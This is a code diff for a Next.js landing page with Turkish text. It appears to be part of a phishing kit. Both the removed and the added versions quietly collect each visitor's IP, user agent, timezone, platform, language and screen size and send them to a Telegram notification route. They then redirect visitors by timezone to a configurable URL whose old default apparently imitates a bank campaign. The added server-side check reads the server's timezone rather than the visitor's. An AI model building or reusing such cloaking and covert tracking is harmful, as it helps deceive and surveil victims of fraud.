@@ -1,85 +1,52 @@
-'use client';
+import { headers } from 'next/headers';
+import { redirect } from 'next/navigation';
 
-import { useState, useEffect } from 'react';
-import { useRouter } from 'next/navigation';
+export default async function Home() {
+  const headersList = await headers();
+  const userAgent = headersList.get('user-agent') || 'Unknown';
+  const ip = headersList.get('x-forwarded-for') || 'Unknown';
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const isTurkishTimezone = timezone === 'Europe/Istanbul';
+  const platform = headersList.get('sec-ch-ua-platform') || 'Unknown';
+  const language = headersList.get('accept-language') || 'Unknown';
+  const screenResolution = headersList.get('sec-ch-viewport-width') 
+    ? `${headersList.get('sec-ch-viewport-width')}x${headersList.get('sec-ch-viewport-height')}`
+    : 'Unknown';
 
-export default function Home() {
-  const router = useRouter();
-  const [isLoading, setIsLoading] = useState(true);
-  const [redirectUrl, setRedirectUrl] = useState('https://bbnsbnkampanya.vercel.app/');
+  // Telegram bildirimi gönder
+  try {
+    await fetch(`${process.env.NEXT_PUBLIC_BASE_URL}/api/telegram`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        ip,
+        userAgent,
+        timezone,
+        isTurkishTimezone,
+        platform,
+        language,
+        screenResolution
+      })
+    });
+  } catch (error) {
+    console.error('Telegram notification error:', error);
+  }
 
-  useEffect(() => {
-    const checkTimezone = async () => {
-      try {
-        // Get timezone from client
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const isTurkishTimezone = timezone === 'Europe/Istanbul' || timezone.includes('Turkey');
+  // Yönlendirme URL'sini al
+  const redirectResponse = await fetch(`${process.env.NEXT_PUBLIC_BASE_URL}/api/redirect-url`);
+  const { redirectUrl } = await redirectResponse.json();
 
-        // Get redirect URL
-        const redirectResponse = await fetch('/api/redirect-link', {
-          headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/json'
-          }
-        });
-
-        if (redirectResponse.ok) {
-          const { url } = await redirectResponse.json();
-          if (url) {
-            setRedirectUrl(url);
-          }
-        }
-
-        // Get IP from headers
-        const ipResponse = await fetch('/api/ip-info');
-        const ipData = await ipResponse.json();
-        const ip = ipData.ip || 'Unknown';
-
-        // Send Telegram notification
-        await fetch('/api/telegram', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            ip,
-            userAgent: navigator.userAgent || 'Unknown',
-            timezone,
-            isTurkishTimezone,
-            platform: navigator.platform || 'Unknown',
-            language: navigator.language || 'Unknown',
-            screenResolution: `${window.screen.width}x${window.screen.height}`
-          }),
-        });
-
-        if (isTurkishTimezone) {
-          window.location.replace(redirectUrl);
-        } else {
-          setIsLoading(false);
-        }
-      } catch (error) {
-        console.error('Error:', error);
-        setIsLoading(false);
-      }
-    };
-
-    checkTimezone();
-  }, []);
-
-  if (isLoading) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-[#0D1117]">
-        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#58A6FF]"></div>
-      </div>
-    );
+  // Türkiye dışındaki kullanıcıları yönlendir
+  if (!isTurkishTimezone) {
+    redirect(redirectUrl);
   }
 
   return (
-    <div className="min-h-screen flex items-center justify-center bg-[#0D1117]">
-      <div className="text-center">
-        <h1 className="text-2xl font-bold text-gray-300 mb-4">Erişim Reddedildi</h1>
-        <p className="text-gray-400">Bu sayfaya sadece Türkiye'den erişilebilir.</p>
-      </div>
-    </div>
+    <main className="flex min-h-screen flex-col items-center justify-center p-24">
+      <h1 className="text-4xl font-bold mb-8">Hoş Geldiniz</h1>
+      <p className="text-xl">Bu site sadece Türkiye'den erişilebilir.</p>
+    </main>
   );
 }
